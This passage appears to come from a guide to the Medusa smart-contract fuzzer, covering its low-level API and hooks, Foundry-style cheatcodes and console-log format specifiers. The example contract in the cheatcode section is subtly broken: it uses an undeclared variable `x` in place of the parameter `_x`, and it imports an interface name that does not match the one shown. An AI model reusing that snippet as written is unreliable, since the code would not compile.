To enable this feature, set `revertReporterEnabled` to `true` in the configuration file. Medusa will generate both **HTML** and **JSON** formats of the report, allowing developers to dive deep into problematic test cases.

#### Medusa’s Low-Level API: Power and Customization for Experts

Medusa exposes a **robust low-level API** that allows developers to access and extend the core components of the fuzzing engine. This architecture enables a high degree of control over the fuzzing lifecycle and behavior.

**🔧 Core Components**

- **Fuzzer**: The main fuzzing engine that handles contract compilation, fuzzing lifecycle management, and spawning worker threads (`FuzzerWorker`).
- **FuzzerWorker**: Each worker runs a fuzzing thread and contains the `TestChain` (a lightweight blockchain instance), the `ValueSet` (input pool), and the logic to generate and execute fuzzed transaction sequences.
- **TestChain**: A sandboxed test blockchain used to simulate contract deployment and transaction execution.

**🧱 Data Types and Providers**

The API is composed of a set of reusable types and interfaces, such as:

- `ProjectConfig`: Project settings and compilation parameters
- `ValueSet`: Configurable input value pools
- `Contract`, `CallSequence`: Represent the contracts and fuzzing transaction sequences
- Providers: `ValueGenerator`, `Fuzzer`, `FuzzerWorker`, and others

Together, they form a complete and modular fuzz testing framework.

**🔄 Event System & Hook Mechanism**

To empower real-time observation and extensibility, Medusa includes a rich **event system** and **hook architecture**. Key features include:

- **Event Hooks**: Such as `FuzzerStartingEvent`, `CallSequenceTested`, which broadcast important fuzzing lifecycle stages
- **Custom Hooks**: Developers can inject logic at critical points using functions like `NewValueGeneratorFunc` or `CallSequenceTestFuncs`

Even Medusa’s **built-in assertion testing and property validation** are implemented using these public interfaces—highlighting the tool’s open and composable design.

**Unleashing Full Customization**

With these APIs and hooks, experienced developers can:

- Implement domain-specific security checks
- Create sophisticated invariant validations
- Integrate with external analysis or logging tools
- Build entirely new testing workflows on top of Medusa

While a **higher-level API** is planned for the future to simplify common testing scenarios, the current low-level API already provides significant power and flexibility, making Medusa a strong choice for advanced fuzzing use cases.

<details><summary>Code</summary>

[custom test case provider](https://github.com/crytic/medusa/blob/8036697794481b7bf9fa78c922ec7fa6a8a3005c/fuzzing/test_case_assertion_provider.go)

[test cases](https://github.com/crytic/medusa/blob/8036697794481b7bf9fa78c922ec7fa6a8a3005c/fuzzing/test_case_assertion.go)

```go
    // Create our fuzzer
    fuzzer, err := fuzzing.NewFuzzer(*projectConfig)
    if err != nil {
        return err
    }

    // Attach our custom test case provider
    attachAssertionTestCaseProvider(fuzzer)

    // Start the fuzzer
    err = fuzzer.Start()
    if err != nil {
        return err
    }
```

</details>

### Cheatcodes and Console Logging in Medusa: Precision Tools for Smart Contract Testing

Medusa offers developers a robust suite of testing tools that enable fine-grained control over the EVM environment during fuzzing. Among these tools are **cheatcodes**—a powerful mechanism that mirrors the functionality of testing frameworks like Foundry, allowing for deterministic manipulation of blockchain state, as well as **console logging** to streamline debugging workflows.

#### Cheatcodes: Low-Level Control of the EVM

Cheatcodes in Medusa are implemented through a dedicated contract deployed at a fixed address:  
`0x7109709ECfa91a80626fF3989D68f67F5b1DD12D`.

This cheatcode contract exposes a rich set of utilities that allow developers to **simulate different EVM conditions**, override blockchain state, and manipulate account and contract properties. Below are some of the key features it offers:

**⏱️ Blockchain Property Manipulation**

- `warp`: Adjust the block timestamp.
- `roll`: Change the current block number.
- `fee`: Modify the base fee for the block.

**🧪 Storage Inspection and Mutation**

- `load`: Read directly from any contract’s storage slot.
- `store`: Write to any contract’s storage slot.

**👤 Identity Spoofing and Balance Editing**

- `prank`: Temporarily change the transaction sender (msg.sender).
- `deal`: Modify account balance and even set contract code.

**🔐 Cryptographic Operations**

- `sign`: Simulate cryptographic signing with a given private key.
- `addr`: Derive the Ethereum address from a given private key.

**🕹️ State Snapshots and Reverts**

- `snapshot`: Take a snapshot of the current EVM state.
- `revertTo`: Revert back to a previously saved snapshot.

**🔄 Type Conversions**

- `toString`, `parse`: Convert between common Solidity types and strings.

Using these cheatcodes is straightforward: developers import the cheatcode interface and instantiate it by pointing to the cheatcode contract address. While Medusa’s interface is inspired by Foundry’s cheatcodes, not all Foundry features are fully supported. Developers should consult the official Medusa documentation for the full list of supported operations.

<details><summary>Code</summary>

```solidity

interface StdCheats {
    // Set block.timestamp
    function warp(uint256) external;

    // Set block.number
    function roll(uint256) external;

    // Set block.basefee
    function fee(uint256) external;

    // Set block.difficulty (deprecated in `medusa`)
    function difficulty(uint256) external;

    // Set block.prevrandao
    function prevrandao(bytes32) external;

    // Set block.chainid
    function chainId(uint256) external;

    // Sets the block.coinbase
    function coinbase(address) external;

    // Loads a storage slot from an address
    function load(address account, bytes32 slot) external returns (bytes32);

    // Stores a value to an address' storage slot
    function store(address account, bytes32 slot, bytes32 value) external;

    // Sets the *next* call's msg.sender to be the input address
    function prank(address) external;

    // Sets all subsequent call's msg.sender (until stopPrank is called) to be the input address
    function startPrank(address) external;

    // Stops a previously called startPrank
    function stopPrank() external;

    // Set msg.sender to the input address until the current call exits
    function prankHere(address) external;

    // Sets an address' balance
    function deal(address who, uint256 newBalance) external;

    // Sets an address' code
    function etch(address who, bytes calldata code) external;

    // Signs data
    function sign(uint256 privateKey, bytes32 digest)
        external
        returns (uint8 v, bytes32 r, bytes32 s);

    // Computes address for a given private key
    function addr(uint256 privateKey) external returns (address);

    // Gets the creation bytecode of a contract
    function getCode(string calldata) external returns (bytes memory);

    // Gets the nonce of an account
    function getNonce(address account) external returns (uint64);

    // Sets the nonce of an account
    // The new nonce must be higher than the current nonce of the account
    function setNonce(address account, uint64 nonce) external;

    // Performs a foreign function call via terminal
    function ffi(string[] calldata) external returns (bytes memory);

    // Take a snapshot of the current state of the EVM
    function snapshot() external returns (uint256);

    // Revert state back to a snapshot
    function revertTo(uint256) external returns (bool);

    // Convert Solidity types to strings
    function toString(address) external returns(string memory);
    function toString(bytes calldata) external returns(string memory);
    function toString(bytes32) external returns(string memory);
    function toString(bool) external returns(string memory);
    function toString(uint256) external returns(string memory);
    function toString(int256) external returns(string memory);

    // Convert strings into Solidity types
    function parseBytes(string memory) external returns(bytes memory);
    function parseBytes32(string memory) external returns(bytes32);
    function parseAddress(string memory) external returns(address);
    function parseUint(string memory)external returns(uint256);
    function parseInt(string memory) external returns(int256);
    function parseBool(string memory) external returns(bool);
}

```

```solidity

// Assuming cheatcode interface is in the same directory
import "./IStdCheats.sol";

// MyContract will utilize the cheatcode interface
contract MyContract {
    // Set up reference to cheatcode contract
    IStdCheats cheats = IStdCheats(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    // This is a test function that will set the msg.sender's nonce to the provided input argument
    function testFunc(uint256 _x) public {
        // Ensure that the input argument is greater than msg.sender's current nonce
        require(_x > cheats.getNonce(msg.sender));

        // Set sender's nonce
        cheats.setNonce(msg.sender, x);

        // Assert that the nonce has been correctly updated
        assert(cheats.getNonce(msg.sender) == x);
    }
}

```

</details>

#### Console Logging: Debug with Precision

Medusa includes a console logging system similar to those in Foundry and Hardhat, allowing developers to print debugging information directly from smart contracts during fuzzing. However, it introduces several unique behaviors in how format specifiers are handled.

**🔤 Supported Format Specifiers**

Medusa supports a variety of specifiers for formatting console output:

- `%v`: The most versatile specifier; supports `uint256`, `int256`, `address`, `bool`, and `string`.
- `%s`: Converts most values into human-readable strings (not compatible with `bool`).
- `%d`: Displays integers in decimal format.
- `%x`: Displays integers in hexadecimal format.
- `%o`: Displays integers in **octal format** (distinct from other platforms).
- `%t`: Designed for boolean values.
- `%%`: Escapes and prints a literal `%`.

Unlike some platforms, Medusa does **not** support specifiers like `%i` or `%e`. When mismatches occur between the number of format specifiers and provided arguments, Medusa responds with specific error messages:

- **Too few arguments**: Unmatched specifiers are replaced with the keyword `"MISSING"`.
- **Too many arguments**: Extra arguments are labeled `"EXTRA"`.
- **No arguments**: The format string is returned unaltered.

**✅ Best Practices**

For maximum compatibility and reliability:

- Use `%v` when unsure of the type or for generic output.
- Use `%s` when aiming for Foundry-style compatibility, but handle booleans separately.
- Always ensure the number of format specifiers matches the number of arguments.

Console logs in Medusa are a powerful tool for **tracking execution flows**, **validating state changes**, and **debugging test behaviors**—essential for developing secure and correct smart contracts.
